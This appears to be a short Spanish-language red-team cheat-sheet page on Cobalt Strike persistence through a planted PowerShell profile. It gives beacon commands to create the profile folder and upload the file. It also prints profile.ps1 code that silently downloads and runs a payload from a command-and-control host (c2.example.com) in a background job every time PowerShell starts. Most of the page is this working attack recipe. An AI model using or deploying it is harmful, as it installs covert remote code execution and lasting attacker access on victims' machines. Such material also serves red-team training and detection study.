---
title: Persistencia — PowerShell Profile
tags: [persistence, cobalt-strike, powershell-profile]
---

# PowerShell Profile

## Descripción

El PowerShell Profile (`profile.ps1`) se ejecuta automáticamente cada vez que PowerShell arranca.

## Crear el directorio si no existe

```
beacon> shell mkdir C:\Users\<user>\Documents\WindowsPowerShell
```

## Contenido del Profile (profile.ps1)

```powershell
$_ = Start-Job -ScriptBlock {
    iex (New-Object Net.WebClient).DownloadString('http://c2.example.com/payload.ps1')
}
```

> [!tip] Usar `Start-Job` para que el payload corra en background sin bloquear la sesión de PS.

## Subir el Profile

```
beacon> upload C:\Payloads\Profile.ps1
beacon> mv Profile.ps1 C:\Users\<user>\Documents\WindowsPowerShell\profile.ps1
```

## Verificar

La próxima vez que el usuario abra PowerShell, el payload se ejecutará.

> [!warning] Sólo funciona si el usuario usa PowerShell. Detectado fácilmente con auditorías de perfil.
